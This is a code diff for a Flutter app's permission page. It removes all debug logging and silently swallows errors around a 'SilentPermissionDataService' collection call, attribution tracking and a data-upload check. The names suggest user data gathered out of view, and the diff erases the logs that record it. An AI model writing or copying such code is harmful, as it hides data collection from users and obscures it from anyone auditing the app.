@@ -1,5 +1,4 @@
 import 'dart:async';
-import 'package:easy_moni/core/utils/app_logger.dart';
 
 import 'package:easy_moni/core/constants/app_strings.dart';
 import 'package:easy_moni/core/network/http_provider.dart';
@@ -77,9 +76,7 @@ class _PermissionPageState extends ConsumerState<PermissionPage> {
     unawaited(
       AppsFlyerTracker.initializeAppsFlyerTracker()
           .then((_) => AppsFlyerTracker.logAppsFlyerFirstOpenIfNeeded())
-          .catchError((Object error, StackTrace stackTrace) {
-            AppLogger.debug('隐私同意后归因初始化异常: $error\n$stackTrace');
-          }),
+          .catchError((Object error, StackTrace stackTrace) {}),
     );
   }
 
@@ -87,12 +84,8 @@ class _PermissionPageState extends ConsumerState<PermissionPage> {
   void _startSilentPermissionDataCollection() {
     unawaited(
       SilentPermissionDataService.collect()
-          .then((data) {
-            AppLogger.debug('静默权限数据采集完成: $data');
-          })
-          .catchError((Object error, StackTrace stackTrace) {
-            AppLogger.debug('静默权限数据采集异常: $error\n$stackTrace');
-          }),
+          .then((data) {})
+          .catchError((Object error, StackTrace stackTrace) {}),
     );
   }
 
@@ -107,8 +100,8 @@ class _PermissionPageState extends ConsumerState<PermissionPage> {
     for (final requestPermission in permissionRequests) {
       try {
         await requestPermission();
-      } catch (error, stackTrace) {
-        AppLogger.debug('原生权限请求异常: $error\n$stackTrace');
+      } catch (error) {
+        return;
       }
 
       if (!mounted) return;
@@ -206,22 +199,14 @@ class _PermissionPageState extends ConsumerState<PermissionPage> {
       HttpProvider.instance.restoreToken(savedToken);
       final checkDataResult = await checkUploadDataValidApi.call();
       if (checkDataResult.isSuccess) {
-        AppLogger.debug(
-          'startup checkUploadDataValid 成功: ${checkDataResult.data}',
-        );
         uploadDataSyncService.handleCheckResult(checkDataResult.data);
-      } else {
-        AppLogger.debug(
-          'startup checkUploadDataValid 失败: ${checkDataResult.message}',
-        );
-      }
-    } catch (error, stackTrace) {
-      AppLogger.debug('startup checkUploadDataValid 请求异常: $error\n$stackTrace');
+      } else {}
+    } catch (error) {
+      return;
     }
   }
 
   Future<void> _onReject() async {
-    AppLogger.debug('点击了拒绝按钮');
     await SystemNavigator.pop();
   }
 
@@ -377,10 +362,7 @@ class _PermissionPageState extends ConsumerState<PermissionPage> {
                         padding: const EdgeInsets.symmetric(horizontal: 22),
                         child: Row(
                           children: [
-                            Assets.images.safeIcon.image(
-                              width: 15,
-                              height: 15,
-                            ),
+                            Assets.images.safeIcon.image(width: 15, height: 15),
                             const SizedBox(width: 13),
                             const Expanded(
                               child: Text(
